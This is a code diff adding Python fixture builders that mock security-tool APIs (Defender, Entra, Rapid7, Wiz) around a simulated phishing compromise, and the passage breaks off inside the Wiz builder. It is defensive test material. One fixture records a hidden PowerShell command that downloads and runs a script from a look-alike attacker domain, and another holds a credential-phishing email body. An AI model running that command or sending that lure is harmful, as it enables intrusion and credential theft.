@@ -1,0 +1,814 @@
+"""Fixture builders for the non-CrowdStrike connectors (same scenario as build_fixtures.py)."""
+
+from __future__ import annotations
+
+import base64
+import json
+import re
+
+import build_fixtures
+from build_fixtures import CVES, EXPOSURE, HOSTS, ORG, PAYLOAD_SHA, PHISH, TOR_IP, USERS, D, route, write
+
+
+class _Out:
+    """The output folder as build_fixtures has it now (estate builders point it elsewhere)."""
+
+    def __truediv__(self, name):
+        return build_fixtures.OUT / name
+
+    def mkdir(self, **kw):
+        build_fixtures.OUT.mkdir(**kw)
+
+
+OUT = _Out()
+
+
+def u(k):
+    return USERS[k]
+
+
+def sid(k):
+    """The person's on-premises Active Directory SID (Entra onPremisesSecurityIdentifier, Defender for Identity
+    AccountSid): the directory mapping that links the two tools."""
+    return f"S-1-5-21-3623811015-3361044348-30300820-{1101 + list(USERS).index(k)}"
+
+
+# ----------------------------------------------------------------------------- Microsoft
+
+
+def defender_endpoint() -> None:
+    machines = [{"id": h["mde"], "computerDnsName": h["fqdn"], "aadDeviceId": h.get("aad"), "lastIpAddress": h["ip"],
+                 "osPlatform": "Windows" if h["platform"] == "Windows" else "Linux", "osVersion": h["os"],
+                 "riskScore": "High" if k == "jane" else "Low", "exposureLevel": "High" if k in {"web01", "db01"} else "Medium",
+                 "healthStatus": "Active", "onboardingStatus": "Onboarded", "lastSeen": f"{D}10:00:00Z",
+                 "machineTags": ["Finance"] if k == "jane" else []}
+                for k, h in HOSTS.items() if "mde" in h]
+    j = HOSTS["jane"]
+    alerts = [
+        {"id": "da-0001", "title": "Suspicious PowerShell command line", "severity": "High", "category": "Execution",
+         "status": "New", "machineId": j["mde"], "computerDnsName": j["fqdn"], "alertCreationTime": f"{D}09:09:30Z",
+         "mitreTechniques": ["T1059.001", "T1105"], "detectionSource": "WindowsDefenderAtp", "incidentId": 4401,
+         "relatedUser": {"userName": "jane.doe", "domainName": "ACME"},
+         "evidence": [{"entityType": "File", "sha256": PAYLOAD_SHA, "fileName": "invoice_viewer.ps1"},
+                      {"entityType": "Url", "url": "https://login.micros0ft-helpdesk.com/p.ps1"}]},
+        {"id": "da-0002", "title": "Exchange Server exploitation attempt blocked", "severity": "Medium",
+         "category": "InitialAccess", "status": "New", "machineId": HOSTS["db01"]["mde"],
+         "computerDnsName": HOSTS["db01"]["fqdn"], "alertCreationTime": f"{D}05:12:00Z", "mitreTechniques": ["T1190"],
+         "detectionSource": "WindowsDefenderAv", "evidence": []},
+    ]
+    vulns = [{"id": f"{HOSTS[hk]['mde']}_{cve}", "machineId": HOSTS[hk]["mde"], "cveId": cve,
+              "productName": " ".join(CVES[cve]["product"].split()[:-1]) or CVES[cve]["product"],
+              "productVersion": CVES[cve]["product"].split()[-1], "severity": CVES[cve]["sev"],
+              "fixingKbId": "KB5034765" if cve == "CVE-2024-21412" else None}
+             for hk, cves in EXPOSURE.items() for cve in cves if "mde" in HOSTS[hk]]
+    by_fqdn = lambda f: [m for m in machines if m["computerDnsName"] == f]
+    write("defender_endpoint", [
+        route("GET", r"^/api/machines$", {"value": by_fqdn(j["fqdn"])},
+              params={"$filter": f"computerDnsName eq '{j['fqdn']}'"}),
+        route("GET", r"^/api/machines$", {"value": by_fqdn(j["fqdn"])},
+              params={"$filter": "startswith(computerDnsName,'jane-lt01')"}),
+        route("GET", r"^/api/machines$", {"value": by_fqdn(HOSTS["bob"]["fqdn"])},
+              params={"$filter": "startswith(computerDnsName,'bob-lt02')"}),
+        route("GET", r"^/api/machines$", {"value": by_fqdn(HOSTS["web01"]["fqdn"])},
+              params={"$filter": "startswith(computerDnsName,'web01')"}),
+        route("GET", r"^/api/machines$", {"value": by_fqdn(HOSTS["db01"]["fqdn"])},
+              params={"$filter": "startswith(computerDnsName,'db01')"}),
+        route("GET", r"^/api/machines$", {"value": []}, params={"$filter": "*"}),
+        route("GET", r"^/api/machines$", {"value": machines}),
+        route("GET", r"^/api/machines/mde-jane01/alerts$", {"value": [alerts[0]]}),
+        route("GET", r"^/api/machines/mde-db01/alerts$", {"value": [alerts[1]]}),
+        route("GET", r"^/api/machines/[^/]+/alerts$", {"value": []}),
+        # one machine by its device id (the investigation looks a host up by the id it already holds)
+        *[route("GET", rf"^/api/machines/{m['id']}$", m) for m in machines],
+        route("GET", rf"^/api/machines/findbyip\(ip='{re.escape(j['ip'])}',timestamp=\d{{4}}-\d\d-\d\dT[^)]*\)$",
+              {"value": by_fqdn(j["fqdn"])}),
+        route("GET", r"^/api/machines/findbyip\(.*\)$", {"value": []}),
+        route("GET", r"^/api/alerts$", {"value": alerts}),
+        route("GET", r"^/api/vulnerabilities/machinesVulnerabilities$", {"value": vulns}),
+        route("GET", rf"^/api/files/{PAYLOAD_SHA}$", {"sha256": PAYLOAD_SHA, "globalPrevalence": 3,
+                                                      "determinationType": "Malware", "signer": None}),
+        route("GET", r"^/api/files/", {"globalPrevalence": 0, "determinationType": "Unknown"}),
+        route("GET", r"^/api/domains/.+/stats$", {"orgPrevalence": 2}),
+        route("GET", r"^/api/users/jane.doe/machines$", {"value": by_fqdn(j["fqdn"])}),
+        route("GET", r"^/api/users/[^/]+/machines$", {"value": []}),
+        route("POST", r"^/api/advancedqueries/run$", {"Results": [
+            {"Timestamp": f"{D}09:07:41Z", "DeviceName": j["fqdn"], "ActionType": "ProcessCreated",
+             "FileName": "powershell.exe", "ProcessCommandLine": "powershell.exe -nop -w hidden -c iex(iwr "
+             "https://login.micros0ft-helpdesk.com/p.ps1)", "SHA256": PAYLOAD_SHA},
+            {"Timestamp": f"{D}09:07:44Z", "DeviceName": j["fqdn"], "ActionType": "ConnectionSuccess",
+             "RemoteUrl": "login.micros0ft-helpdesk.com"}]}, body_contains=["jane-lt01"]),
+        route("POST", r"^/api/advancedqueries/run$", {"Results": []}),
+        route("POST", r"^/api/indicators$", {"id": "ind-9001"}),
+    ])
+
+
+def defender_office365() -> None:
+    mbox = f"soc-reports@{ORG}"
+    events = [{"Timestamp": f"{D}09:02:0{i}Z", "NetworkMessageId": PHISH["nmid"], "InternetMessageId": PHISH["imid"],
+               "SenderFromAddress": PHISH["sender"], "SenderMailFromAddress": PHISH["sender"],
+               "SenderDisplayName": PHISH["display"], "SenderIPv4": PHISH["sender_ip"],
+               "SenderFromDomain": PHISH["sender_domain"], "RecipientEmailAddress": u(r)["upn"],
+               "Subject": PHISH["subject"], "DeliveryAction": "Delivered", "DeliveryLocation": "Inbox/folder",
+               "LatestDeliveryAction": "", "ThreatTypes": "", "DetectionMethods": "", "UrlCount": 1, "AttachmentCount": 0,
+               "AuthenticationDetails": '{"SPF":"pass","DKIM":"none","DMARC":"fail","CompAuth":"fail"}',
+               "Url": PHISH["url"], "UrlDomain": PHISH["url_domain"], "SHA256": "", "FileName": ""}
+              for i, r in enumerate(PHISH["recipients"])]
+    variant = dict(events[0], NetworkMessageId="nm-7f3a-0002",
+                   InternetMessageId="<20260920091500.2222@micros0ft-helpdesk.com>",
+                   RecipientEmailAddress=u("priya")["upn"], Subject="Re: Action required: your password expires today",
+                   Timestamp=f"{D}09:15:00Z", Url="https://login.micros0ft-helpdesk.com/verify?u=priya.nair")
+    unrelated = dict(events[0], NetworkMessageId="nm-legit-0003", InternetMessageId="<newsletter@vendor.example>",
+                     SenderFromAddress="news@vendor.example", SenderFromDomain="vendor.example",
+                     SenderDisplayName="Vendor News", Subject="September product update", Url="https://vendor.example/news",
+                     UrlDomain="vendor.example", RecipientEmailAddress=u("arun")["upn"], SenderIPv4="198.51.100.20",
+                     AuthenticationDetails='{"SPF":"pass","DKIM":"pass","DMARC":"pass","CompAuth":"pass"}')
+    clicks = [
+        {"Timestamp": f"{D}09:05:10Z", "AccountUpn": u("jane")["upn"], "Url": PHISH["url"], "ActionType": "ClickAllowed",
+         "IsClickedThrough": True, "NetworkMessageId": PHISH["nmid"], "IPAddress": HOSTS["jane"]["ip"], "Workload": "Email"},
+        {"Timestamp": f"{D}09:11:02Z", "AccountUpn": u("priya")["upn"], "Url": PHISH["url"], "ActionType": "ClickBlocked",
+         "IsClickedThrough": False, "NetworkMessageId": PHISH["nmid"], "IPAddress": "10.20.1.31", "Workload": "Email"},
+    ]
+    reported = {"id": "rep-msg-0001", "subject": f"Phishing report: {PHISH['subject']}",
+                "from": {"emailAddress": {"address": u("bob")["upn"], "name": u("bob")["name"]}},
+                "receivedDateTime": f"{D}09:20:00Z", "hasAttachments": True,
+                "internetMessageId": f"<report-0001@{ORG}>"}
+    mime = (f"Return-Path: <{PHISH['sender']}>\r\nReceived: from mail.micros0ft-helpdesk.com ({PHISH['sender_ip']}) by "
+            f"mx.{ORG}; Sun, 20 Sep 2026 09:02:00 +0000\r\nAuthentication-Results: mx.{ORG}; spf=pass "
+            "smtp.mailfrom=micros0ft-helpdesk.com; dkim=none; dmarc=fail header.from=micros0ft-helpdesk.com\r\n"
+            f"From: \"{PHISH['display']}\" <{PHISH['sender']}>\r\nTo: {u('bob')['upn']}\r\nSubject: {PHISH['subject']}\r\n"
+            f"Message-ID: {PHISH['imid']}\r\nDate: Sun, 20 Sep 2026 09:02:00 +0000\r\nMIME-Version: 1.0\r\n"
+            "Content-Type: text/html; charset=utf-8\r\n\r\n"
+            "<html><body><p>Dear user,</p><p>Your Microsoft 365 password <b>expires today</b>. To avoid losing access "
+            "to your mailbox, verify your account immediately.</p>"
+            f"<p><a href=\"{PHISH['url']}\">Keep my password</a></p><p>Microsoft 365 Support Team</p></body></html>\r\n")
+    alert = {"id": "mdo-alert-0001", "title": "Email reported by user as malware or phish", "severity": "informational",
+             "category": "InitialAccess", "status": "new", "createdDateTime": f"{D}09:20:05Z",
+             "alertWebUrl": "https://security.microsoft.com/alerts/mdo-alert-0001", "incidentId": "4402",
+             "evidence": [{"@odata.type": "#microsoft.graph.security.userEvidence",
+                           "userAccount": {"userPrincipalName": u("bob")["upn"]}},
+                          {"@odata.type": "#microsoft.graph.security.urlEvidence", "url": PHISH["url"]},
+                          {"@odata.type": "#microsoft.graph.security.analyzedMessageEvidence",
+                           "senderIp": PHISH["sender_ip"], "networkMessageId": PHISH["nmid"],
+                           "internetMessageId": PHISH["imid"], "subject": PHISH["subject"],
+                           "recipientEmailAddress": u("bob")["upn"], "deliveryAction": "delivered",
+                           "antiSpamDirection": "inbound", "p1Sender": {"emailAddress": PHISH["sender"],
+                                                                         "domainName": PHISH["sender_domain"]}}]}
+    hunt = r"^/v1.0/security/runHuntingQuery$"
+    # recipient history with a sender domain (the user-behaviour model's contact features): months of delivered mail
+    # from the organisation's regular senders - including the real supplier, whose account an attacker may use - and
+    # none from look-alike or first-time domains
+    regular = {"azure.microsoft.com": (u("jane")["upn"], 11, "2026-08-21T07:55:00Z"),
+               "github.com": (u("jane")["upn"], 37, "2026-09-17T16:20:00Z"),
+               "krishna-logistics.com": (u("arun")["upn"], 14, "2026-08-28T10:05:00Z")}
+    history_routes = [route("POST", hunt, {"results": [{"RecipientEmailAddress": who, "Messages": n, "Last": last}]},
+                            body_contains=["sender-history", domain]) for domain, (who, n, last) in regular.items()]
+    history_routes.append(route("POST", hunt, {"results": []}, body_contains="sender-history"))
+    write("defender_office365", [
+        route("GET", rf"^/v1.0/users/{mbox}/mailFolders/inbox/messages$", {"value": [reported]}),
+        route("GET", rf"^/v1.0/users/{mbox}/messages/rep-msg-0001/attachments$", {"value": [
+            {"@odata.type": "#microsoft.graph.fileAttachment", "id": "att-1", "name": "original.eml",
+             "contentType": "message/rfc822", "contentBytes": base64.b64encode(mime.encode()).decode()}]}),
+        route("GET", r"^/v1.0/security/alerts_v2$", {"value": [alert]}),
+        *history_routes,                                   # first: other hunting routes match on recipient names too
+        route("POST", hunt, {"results": clicks}, body_contains="UrlClickEvents | where Timestamp > ago(14d)"),
+        route("POST", hunt, {"results": clicks[:1]}, body_contains=["UrlClickEvents", "jane.doe"]),
+        route("POST", hunt, {"results": []}, body_contains="UrlClickEvents"),
+        route("POST", hunt, {"results": events + [variant, unrelated]}, body_contains="let senders"),
+        route("POST", hunt, {"results": [{"Timestamp": f"{D}09:30:00Z", "NetworkMessageId": PHISH["nmid"],
+                                          "RecipientEmailAddress": u("raj")["upn"], "Action": "Moved to Junk",
+                                          "ActionType": "ZAP", "ActionResult": "Success", "DeliveryLocation": "Junk"}]},
+              body_contains="EmailPostDeliveryEvents"),
+        route("POST", hunt, {"results": events}, body_contains=PHISH["nmid"]),
+        route("POST", hunt, {"results": events}, body_contains=PHISH["imid"]),
+        route("POST", hunt, {"results": [{"Messages": 9}]}, body_contains=["EmailUrlInfo", "micros0ft"]),
+        route("POST", hunt, {"results": events[:1]}, body_contains=["EmailEvents", "jane.doe"]),
+        route("POST", hunt, {"results": []}),
+        route("POST", r"^/beta/security/collaboration/analyzedEmails/remediate$", {"id": "remediation-001",
+                                                                                   "status": "running"}),
+    ])
+
+
+def entra() -> None:
+    users = [{"id": x["id"], "userPrincipalName": x["upn"], "mail": x["upn"], "displayName": x["name"],
+              "department": x["dept"], "jobTitle": x["title"], "accountEnabled": True,
+              "onPremisesSamAccountName": x["upn"].split("@")[0], "onPremisesSecurityIdentifier": sid(k),
+              "createdDateTime": "2022-01-10T00:00:00Z"}
+             for k, x in USERS.items()]
+    j = u("jane")
+    signins = [
+        {"id": "si-001", "createdDateTime": f"{D}08:30:00Z", "userPrincipalName": j["upn"], "userId": j["id"],
+         "appDisplayName": "Office 365 Exchange Online", "ipAddress": "203.0.113.10", "clientAppUsed": "Browser",
+         "status": {"errorCode": 0}, "location": {"city": "Kolkata", "countryOrRegion": "IN"},
+         "riskLevelDuringSignIn": "none", "riskState": "none", "conditionalAccessStatus": "success",
+         "deviceDetail": {"deviceId": HOSTS["jane"]["aad"], "displayName": "JANE-LT01", "isCompliant": True}, "isInteractive": True,
+         "riskEventTypes_v2": []},
+        {"id": "si-002", "createdDateTime": f"{D}09:15:40Z", "userPrincipalName": j["upn"], "userId": j["id"],
+         "appDisplayName": "Office 365 Exchange Online", "ipAddress": TOR_IP, "clientAppUsed": "Browser",
+         "status": {"errorCode": 0}, "location": {"city": "Frankfurt", "countryOrRegion": "DE"},
+         "riskLevelDuringSignIn": "high", "riskState": "atRisk", "conditionalAccessStatus": "success",
+         "deviceDetail": {"deviceId": "", "displayName": "", "isCompliant": False}, "isInteractive": True,
+         "riskEventTypes_v2": ["anonymizedIPAddress"]},
+    ]
+    detections = [{"id": "rd-001", "userPrincipalName": j["upn"], "userId": j["id"], "riskEventType": "anonymizedIPAddress",
+                   "riskLevel": "high", "ipAddress": TOR_IP, "detectedDateTime": f"{D}09:15:41Z",
+                   "detectionTimingType": "realtime", "location": {"city": "Frankfurt", "countryOrRegion": "DE"}}]
+    risky = [{"id": j["id"], "userPrincipalName": j["upn"], "riskLevel": "high", "riskState": "atRisk",
+              "riskDetail": "none", "riskLastUpdatedDateTime": f"{D}09:15:41Z"}]
+    rules = [{"id": "rule-1", "displayName": "..", "sequence": 1, "isEnabled": True,
+              "conditions": {"subjectContains": ["invoice", "payment"]},
+              "actions": {"forwardTo": [{"emailAddress": {"address": "archive.box@protonmail.example"}}],
+                          "moveToFolder": "RSS Feeds"}}]
+    audits = [{"id": "da-001", "activityDateTime": f"{D}09:18:02Z", "activityDisplayName": "Set-InboxRule",
+               "category": "UserManagement", "result": "success",
+               "initiatedBy": {"user": {"userPrincipalName": j["upn"], "id": j["id"]}},
+               "targetResources": [{"type": "User", "userPrincipalName": j["upn"]}]}]
+    routes = [
+        route("GET", r"^/v1.0/users$", {"value": users}),
+        route("GET", r"^/v1.0/auditLogs/signIns$", {"value": signins}, params={"$filter": f"~userPrincipalName eq '{j['upn']}'"}),
+        route("GET", r"^/v1.0/auditLogs/signIns$", {"value": [signins[1]]}, params={"$filter": f"ipAddress eq '{TOR_IP}'"}),
+        route("GET", r"^/v1.0/auditLogs/signIns$", {"value": []}, params={"$filter": "*"}),
+        route("GET", r"^/v1.0/auditLogs/signIns$", {"value": signins}),
+        route("GET", r"^/v1.0/identityProtection/riskyUsers$", {"value": risky},
+              params={"$filter": f"userPrincipalName eq '{j['upn']}'"}),
+        route("GET", r"^/v1.0/identityProtection/riskyUsers$", {"value": []}, params={"$filter": "*"}),
+        route("GET", r"^/v1.0/identityProtection/riskyUsers$", {"value": risky}),
+        route("GET", r"^/v1.0/identityProtection/riskDetections$", {"value": detections}),
+        # the identity lookup's device question (Graph's per-user device lists refuse application permissions)
+        route("GET", r"^/v1.0/auditLogs/directoryAudits$", {"value": [
+            {"id": "da-dev-001", "activityDateTime": f"{D}09:17:00Z", "activityDisplayName": "Add registered owner to device",
+             "category": "Device", "result": "success", "initiatedBy": {"app": {"displayName": "Device Registration Service"}},
+             "targetResources": [{"type": "Device", "id": "dev-2", "displayName": "DESKTOP-7H2K9Q"},
+                                 {"type": "User", "id": j["id"], "userPrincipalName": j["upn"]}]}]},
+              params={"$filter": "~Add registered owner to device"}),
+        route("GET", r"^/v1.0/auditLogs/directoryAudits$", {"value": audits}),
+    ]
+    for k, x in USERS.items():
+        member = [{"@odata.type": "#microsoft.graph.group", "displayName": f"{x['dept']} Team"}]
+        if k == "bob":
+            member.append({"@odata.type": "#microsoft.graph.directoryRole", "displayName": "Exchange Administrator"})
+        if k == "raj":
+            member.append({"@odata.type": "#microsoft.graph.group", "displayName": "VIP-Executives"})
+        routes += [
+            route("GET", rf"^/v1.0/users/{x['upn']}$", next(v for v in users if v["userPrincipalName"] == x["upn"])),
+            route("GET", rf"^/v1.0/users/{x['upn']}/transitiveMemberOf$", {"value": member}),
+            route("GET", rf"^/v1.0/users/{x['upn']}/authentication/methods$", {"value": [
+                {"@odata.type": "#microsoft.graph.passwordAuthenticationMethod"},
+                {"@odata.type": "#microsoft.graph.microsoftAuthenticatorAuthenticationMethod"}]}),
+            route("GET", rf"^/v1.0/users/{x['upn']}/mailFolders/inbox/messageRules$", {"value": rules if k == "jane" else []}),
+        ]
+    # Azure Resource Manager (management.azure.com): subscriptions and who holds which Azure role on them
+    prod, dev = "11111111-2222-3333-4444-000000000001", "11111111-2222-3333-4444-000000000002"
+    owner, contributor, reader = ("8e3af657-a8ff-443c-a75c-2fe8c4bcb635", "b24988ac-6180-42a0-ab88-20f7382dd24c",
+                                  "acdd72a7-3385-48ef-bd42-f606fba81ae7")
+    routes.append(route("GET", r"^/subscriptions$", {"value": [
+        {"subscriptionId": prod, "displayName": "Acme Production", "state": "Enabled"},
+        {"subscriptionId": dev, "displayName": "Acme Development", "state": "Enabled"}]}))
+
+    def assignment(sub, role, principal_id, principal_type="User", scope=None):
+        return {"id": f"/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments/{principal_id}-{role[:8]}",
+                "properties": {"roleDefinitionId": f"/subscriptions/{sub}/providers/Microsoft.Authorization/roleDefinitions/{role}",
+                               "principalId": principal_id, "principalType": principal_type,
+                               "scope": scope or f"/subscriptions/{sub}"}}
+
+    held = {"bob": [(prod, owner, "User", None)],                                   # already an Exchange admin
+            "jane": [(prod, contributor, "Group", f"/subscriptions/{prod}/resourceGroups/finance-apps")],
+            "raj": [(dev, reader, "User", None)]}
+    for k, x in USERS.items():
+        for sub in (prod, dev):
+            mine = [assignment(s, r, x["id"] if t == "User" else "grp-finance-team", t, sc)
+                    for s, r, t, sc in held.get(k, []) if s == sub]
+            routes.append(route("GET", rf"^/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments$",
+                                {"value": mine}, params={"$filter": f"assignedTo('{x['id']}')"}))
+    for sub in (prod, dev):          # anyone else (e.g. a generated organisation's extra staff): no Azure roles
+        routes.append(route("GET", rf"^/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments$",
+                            {"value": []}, params={"$filter": "*"}))
+    write("entra", routes)
+
+
+def defender_identity() -> None:
+    """Defender for Identity: one alert on Jane's laptop after the compromise (it names her by SID and account name
+    only - the directory links her), her domain logons, Bob's routine logon and a machine-account logon (not a person)."""
+    j, b = u("jane"), u("bob")
+    alert = {"id": "mdi-alert-0001", "title": "Account enumeration reconnaissance (LDAP)", "severity": "medium",
+             "status": "new", "category": "Discovery", "serviceSource": "microsoftDefenderForIdentity",
+             "detectionSource": "microsoftDefenderForIdentity", "incidentId": "mdi-inc-0001",
+             "createdDateTime": f"{D}09:43:00Z", "lastUpdateDateTime": f"{D}09:44:00Z",
+             "mitreTechniques": ["T1087.002"], "description": "Directory queries for many accounts from one device.",
+             "alertWebUrl": "https://security.microsoft.com/alerts/mdi-alert-0001",
+             "evidence": [{"@odata.type": "#microsoft.graph.security.userEvidence",
+                           "userAccount": {"accountName": "jane.doe", "domainName": "ACME", "userSid": sid("jane")}},
+                          {"@odata.type": "#microsoft.graph.security.deviceEvidence",
+                           "deviceDnsName": HOSTS["jane"]["fqdn"], "mdeDeviceId": HOSTS["jane"]["mde"],
+                           "ipInterfaces": [HOSTS["jane"]["ip"]]}]}
+    hunt = r"^/v1.0/security/runHuntingQuery$"
+
+    def logon(rid, when, who, action, protocol, host, ip, *, upn=None, failure=None, sam=None):
+        return {"Timestamp": f"{D}{when}Z", "ReportId": rid, "ActionType": action, "Application": "Active Directory",
+                "LogonType": "Network" if protocol == "NTLM" else "Interactive", "Protocol": protocol,
+                "FailureReason": failure, "AccountName": sam or (who["upn"].split("@")[0] if who else None),
+                "AccountDomain": "ACME", "AccountUpn": upn, "AccountSid": sid(next(k for k, v in USERS.items() if v is who))
+                if who else None, "AccountObjectId": None, "AccountDisplayName": who["name"] if who else None,
+                "DeviceName": host, "IPAddress": ip, "DestinationDeviceName": "DC01",
+                "DestinationIPAddress": "10.10.0.2"}
+
+    logons = [logon("mdi-logon-0001", "07:58:00", b, "LogonSuccess", "Kerberos", "BOB-LT02", HOSTS["bob"]["ip"],
+                    upn=b["upn"]),
+              logon("mdi-logon-0002", "08:25:00", j, "LogonSuccess", "Kerberos", "JANE-LT01", HOSTS["jane"]["ip"],
+                    upn=j["upn"]),
+              logon("mdi-logon-0003", "09:41:30", j, "LogonFailed", "NTLM", "JANE-LT01", HOSTS["jane"]["ip"],
+                    failure="InvalidPassword"),
+              logon("mdi-logon-0004", "09:42:00", None, "LogonSuccess", "Kerberos", "JANE-LT01", HOSTS["jane"]["ip"],
+                    sam="JANE-LT01$")]
+    write("defender_identity", [
+        route("GET", r"^/v1.0/security/alerts_v2$", {"value": [alert]}),
+        route("POST", hunt, {"results": logons}, body_contains="IdentityLogonEvents"),
+        route("POST", hunt, {"results": []}),
+    ])
+
+
+# ----------------------------------------------------------------------------- exposure tools
+
+
+def rapid7() -> None:
+    order = ("web01", "db01", "fs01", "jane")
+    assets = []
+    for k in order:
+        h = HOSTS[k]
+        cves = EXPOSURE.get(k, [])
+        assets.append({"id": h.get("r7", 110), "hostName": h["fqdn"], "ip": h["ip"], "os": h["os"],
+                       "riskScore": 25000.0 if cves else 120.0,
+                       "addresses": [{"ip": h["ip"], "mac": h["mac"]}] if h.get("mac") else [{"ip": h["ip"]}],
+                       "vulnerabilities": {"total": len(cves), "critical": sum(CVES[c]["cvss"] >= 9 for c in cves)},
+                       "history": [{"date": f"{D}03:00:00Z"}], "tags": [{"name": "Production"}] if k != "jane" else []})
+    routes = [route("GET", r"^/api/3/assets$", {"resources": assets, "page": {"number": 0, "size": 500, "totalPages": 1,
+                                                                               "totalResources": len(assets)}})]
+    for a, k in zip(assets, order):
+        findings = [{"id": f"r7-{c.lower()}", "status": "vulnerable", "since": "2026-08-15T00:00:00Z"}
+                    for c in EXPOSURE.get(k, []) if not (k == "web01" and c == "CVE-2023-44487")]  # coverage gap
+        routes.append(route("GET", rf"^/api/3/assets/{a['id']}/vulnerabilities$", {"resources": findings}))
+        routes.append(route("GET", rf"^/api/3/assets/{a['id']}$", a))
+    for c, meta in CVES.items():
+        routes.append(route("GET", rf"^/api/3/vulnerabilities/r7-{c.lower()}$", {
+            "id": f"r7-{c.lower()}", "title": meta["desc"], "cves": [c], "cvss": {"v3": {"score": meta["cvss"]}},
+            "severity": {"Critical": "Critical", "High": "Severe"}.get(meta["sev"], "Moderate"),
+            "exploits": 2 if meta["kev"] else 0, "malwareKits": 1 if c == "CVE-2021-44228" else 0}))
+        routes.append(route("GET", rf"^/api/3/vulnerabilities/r7-{c.lower()}/solutions$",
+                            {"resources": [f"r7-sol-{c.lower()}"]}))
+        routes.append(route("GET", rf"^/api/3/solutions/r7-sol-{c.lower()}$", {
+            "id": f"r7-sol-{c.lower()}", "type": "rollup",
+            "summary": {"text": f"Upgrade {meta['product']}", "html": f"<p>Upgrade {meta['product']}</p>"}}))
+    routes += [
+    ]
+    exceptions = [
+        {"id": 9001, "state": "Approved", "expires": "2026-12-31T00:00:00Z",
+         "scope": {"type": "Asset", "id": HOSTS["web01"]["r7"], "vulnerability": "r7-cve-2023-38408"},
+         "submit": {"reason": "Compensating Control", "comment": "Agent forwarding disabled fleet-wide",
+                    "date": "2026-08-20T10:00:00Z"},
+         "review": {"comment": "Approved until the next maintenance window", "date": "2026-08-21T09:00:00Z"}},
+        {"id": 9002, "state": "Approved", "expires": "2026-09-01T00:00:00Z",
+         "scope": {"type": "Asset", "id": 110, "vulnerability": "r7-cve-2024-21412"},
+         "submit": {"reason": "Acceptable Risk", "comment": "Deferred to the quarterly patch cycle",
+                    "date": "2026-07-01T10:00:00Z"},
+         "review": {"comment": "Approved for 60 days", "date": "2026-07-02T09:00:00Z"}}]
+    routes.append(route("GET", r"^/api/3/vulnerability_exceptions$", {"resources": exceptions, "page": {
+        "number": 0, "size": 500, "totalPages": 1, "totalResources": len(exceptions)}}))
+    for c in CVES:  # asset search with the "cve" filter -> assets where Rapid7 reports that CVE
+        hit = [a for a, k in zip(assets, order) if c in EXPOSURE.get(k, []) and not (k == "web01" and c == "CVE-2023-44487")]
+        routes.append(route("POST", r"^/api/3/assets/search$", {"resources": hit}, body_contains=['"cve"', c]))
+    routes += [
+        route("POST", r"^/api/3/assets/search$", {"resources": []}, body_contains='"cve"'),
+        route("POST", r"^/api/3/assets/search$", {"resources": [assets[0]]}, body_contains="web01"),
+        route("POST", r"^/api/3/assets/search$", {"resources": [assets[1]]}, body_contains="db01"),
+        route("POST", r"^/api/3/assets/search$", {"resources": [assets[3]]}, body_contains="jane"),
+        route("POST", r"^/api/3/assets/search$", {"resources": []}),
+    ]
+    write("rapid7", routes)
+
+
+def wiz() -> None:
+    w = HOSTS["web01"]
+    resources = [{"id": w["wiz"], "name": "web01", "type": "VIRTUAL_MACHINE", "subscriptionId": "wiz-sub-001",
+                  "subscriptionExternalId": "sub-001",
+                  "graphEntity": {"id": w["wiz"], "providerUniqueId": w["cloud"], "name": "web01",
+                                  "type": "VIRTUAL_MACHINE", "firstSeen": "2026-03-02T00:00:00Z",
+                                  "lastSeen": f"{D}04:00:00Z",
+                                  "properties": {"hostname": "web01", "externalId": w["cloud"], "region": "centralindia",
+                                                 "privateIpAddresses": [w["ip"]], "operatingSystem": "Linux",
+                                                 "hasWideInternetExposure": True}}}]
+    vulns = [{"id": f"wiz-vf-{c.lower()}", "name": c, "CVSSSeverity": CVES[c]["sev"].upper(), "score": CVES[c]["cvss"],
+              "exploitabilityScore": 3.9, "hasExploit": CVES[c]["kev"], "hasCisaKevExploit": CVES[c]["kev"],
+              "status": "OPEN", "firstDetectedAt": "2026-08-20T00:00:00Z", "lastDetectedAt": f"{D}04:00:00Z",
+              "fixedVersion": "2.17.1" if c == "CVE-2021-44228" else None, "detailedName": CVES[c]["product"].split()[0],
+              "version": CVES[c]["product"].split()[-1], "remediation": f"Upgrade {CVES[c]['product']}",
+              "portalUrl": f"https://app.wiz.io/vulnerability-findings#{c}",
+              "vulnerableAsset": {"id": w["wiz"], "name": "web01", "type": "VIRTUAL_MACHINE",
+                                  "providerUniqueId": w["cloud"], "ipAddresses": [w["ip"]], "operatingSystem": "Linux",
+                                  "hasWideInternetExposure": True}} for c in EXPOSURE["web01"]]
+    issues = [{"id": "wiz-issue-001", "severity": "HIGH", "status": "OPEN", "createdAt": "2026-09-18T00:00:00Z",
+               "type": "TOXIC_COMBINATION",
+               "sourceRule": {"__typename": "Control", "id": "wc-id-1001", "name": "Publicly exposed VM with critical vulnerability and high-privileged identity"},
+               "entitySnapshot": {"id": w["wiz"], "name": "web01", "type": "VIRTUAL_MACHINE", "providerId": w["cloud"],
+                                  "region": "centralindia", "cloudPlatform": "Azure", "subscriptionExternalId": "sub-001"}},
+              {"id": "wiz-issue-002", "severity": "MEDIUM", "status": "OPEN", "createdAt": "2026-09-10T00:00:00Z",
+               "type": "CLOUD_CONFIGURATION", "sourceRule": {"__typename": "CloudConfigurationRule", "id": "wcr-id-2002", "name": "Storage account allows public blob access"},
+               "entitySnapshot": {"id": "wiz-sa-backups", "name": "acmebackups", "type": "BUCKET",
+                                  "providerId": "/subscriptions/sub-001/resourceGroups/prod/providers/Microsoft.Storage/"
+                                                "storageAccounts/acmebackups", "region": "centralindia",
+                                  "cloudPlatform": "Azure", "subscriptionExternalId": "sub-001"}}]
+    pi = {"hasNextPage": False, "endCursor": "c1"}
+    write("wiz", [
+        route("POST", r"^/graphql$", {"data": {"cloudResources": {"nodes": resources, "pageInfo": pi, "totalCount": 1}}},
+              body_contains="cloudResources"),
+        *[route("POST", r"^/graphql$", {"data": {"vulnerabilityFindings": {
+            "nodes": [v for v in vulns if v["name"] == c], "pageInfo": pi}}}, body_contains=["vulnerabilityExternalId", f'"{c}"'])
+          for c in CVES],
+        route("POST", r"^/graphql$", {"data": {"vulnerabilityFindings": {"nodes": [], "pageInfo": pi}}},
+              body_contains="vulnerabilityExternalId"),
+        route("POST", r"^/graphql$", {"data": {"vulnerabilityFindings": {"nodes": vulns, "pageInfo": pi}}},
+              body_contains="vulnerabilityFindings"),
